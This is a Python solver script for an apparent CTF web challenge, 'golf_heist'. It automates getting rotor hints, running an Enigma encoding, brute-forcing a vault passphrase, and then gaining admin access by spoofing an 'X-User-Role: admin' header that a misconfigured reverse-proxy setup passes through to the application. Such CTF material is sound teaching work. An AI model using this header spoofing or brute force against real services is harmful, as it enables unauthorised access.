#!/usr/bin/env python3
"""
Solver for web/golf_heist (CSAW 2026 Quals).

Chain of the exploit (see challenge-repo's own solve.txt for the manual
walkthrough -- this script automates it end to end):

  1. The pro-shop inventory endpoints (/pro-shop/inventory/clubs|balls|bags)
     return HTTP 418 "teapot" responses carrying an `X-Golf-Hint` header.
     Each hint is base64("{rotor:06d}") for one Enigma rotor offset
     (I, II, III respectively).
  2. POST /api/enigma/encode with those three rotor offsets runs the
     (mini) Enigma cipher on "GOL" and returns three resulting letters.
  3. /api/word-table exposes the word list used to turn each letter into
     a vault passphrase word. The challenge doesn't say which of the 3
     synonyms per letter is the "real" one, so we brute force the 3x3x3=27
     combinations against POST /api/vault/enter until one is accepted.
  4. The accepted phrase gets you "privileged" tier, but the special item
     is admin-only. The vault page links a CVE (GHSA-7r4p-vjf4-gxv4)
     about a Caddy reverse-proxy forward_auth misconfiguration that
     forwards client-supplied X-User-Role/X-User-Id headers to the
     upstream instead of stripping them. The /api/vault/admin-item
     endpoint trusts an `X-User-Role: admin` header straight from the
     client with no actual authentication -- classic header-injection /
     broken-auth via a trusted-proxy assumption that doesn't hold.
  5. POST /api/vault/admin-item with the correct phrase AND
     `X-User-Role: admin` returns the flag.

Usage:
    python3 solve_golf_heist.py <host> <port>
    (defaults to localhost:8000)
"""
import sys
import base64
import itertools
import requests

HOST = sys.argv[1] if len(sys.argv) > 1 else "localhost"
PORT = sys.argv[2] if len(sys.argv) > 2 else "8000"
BASE = f"http://{HOST}:{PORT}"

ALPHA = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


def get_rotor(path):
    r = requests.get(f"{BASE}/pro-shop/inventory/{path}")
    hint = r.headers["X-Golf-Hint"]
    return int(base64.b64decode(hint).decode())


def main():
    print("[*] Fetching rotor hints from pro-shop 418 responses...")
    r1 = get_rotor("clubs")
    r2 = get_rotor("balls")
    r3 = get_rotor("bags")
    print(f"[+] Rotors: r1={r1} r2={r2} r3={r3}")

    print("[*] Running the Enigma cipher via /api/enigma/encode...")
    resp = requests.post(f"{BASE}/api/enigma/encode",
                          json={"r1": r1, "r2": r2, "r3": r3}).json()
    letters = resp["output"]
    print(f"[+] Enigma output letters: {letters}")

    print("[*] Fetching word table...")
    table = requests.get(f"{BASE}/api/word-table").json()["table"]

    candidates = [table[letters[0]], table[letters[1]], table[letters[2]]]

    print("[*] Brute-forcing which synonym combination unlocks the vault...")
    phrase = None
    for combo in itertools.product(*candidates):
        guess = " ".join(combo)
        r = requests.post(f"{BASE}/api/vault/enter", json={"phrase": guess})
        if r.status_code == 200 and r.json().get("success"):
            phrase = guess
            print(f"[+] Vault phrase found: {phrase!r}")
            print(f"    -> {r.json()}")
            break
    if phrase is None:
        print("[-] Could not find a working phrase combination.")
        sys.exit(1)

    print("[*] Exploiting trusted X-User-Role header (CVE GHSA-7r4p-vjf4-gxv4)...")
    r = requests.post(
        f"{BASE}/api/vault/admin-item",
        json={"phrase": phrase},
        headers={"X-User-Role": "admin", "X-User-Id": "solver"},
    )
    data = r.json()
    print(f"[+] Response: {data}")

    flag = data.get("flag")
    if flag:
        print(f"\n[*] FLAG: {flag}")
    else:
        print("[-] No flag in response.")
        sys.exit(1)


if __name__ == "__main__":
    main()
